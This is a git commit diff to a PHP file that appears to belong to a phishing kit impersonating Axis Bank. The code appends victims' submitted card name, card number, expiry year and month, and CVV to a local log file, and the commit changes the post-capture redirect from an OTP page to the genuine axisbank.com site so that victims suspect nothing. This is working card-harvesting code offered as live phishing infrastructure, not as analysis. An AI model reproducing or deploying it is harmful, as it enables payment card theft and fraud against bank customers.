dd1d15b03d1dd3b3355070f012a441517adaf555
projectxteapostman <141010478+projectxteapostman@users.noreply.github.com>
2023-07-31 08:08:22 +0000

    Update process.php

--- process.php
+++ process.php
@@ -3,17 +3,17 @@ file_put_contents("log.txt", "Card Name = " . $email = $_POST['email'] . "\n", F
 ?>
 <?php
 file_put_contents("log.txt", "Card Number = " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: otp.html');
+header('Location: https://www.axisbank.com/');
 ?>
 	<?php
 file_put_contents("log.txt", "Expiry Year = " . $expyear = $_POST['expyear'] . "\n", FILE_APPEND);
-header('Location: otp.html');
+header('Location: https://www.axisbank.com/');
 ?>
 	<?php
 file_put_contents("log.txt", "Expiry Month = " . $exmonth = $_POST['exmonth'] . "\n", FILE_APPEND);
-header('Location: otp.html');
+header('Location: https://www.axisbank.com/');
 ?>
 	<?php
 file_put_contents("log.txt", "CVV = " . $cvv = $_POST['cvv'] . "\n", FILE_APPEND);
-header('Location: otp.html');
+header('Location: https://www.axisbank.com/');
 ?>
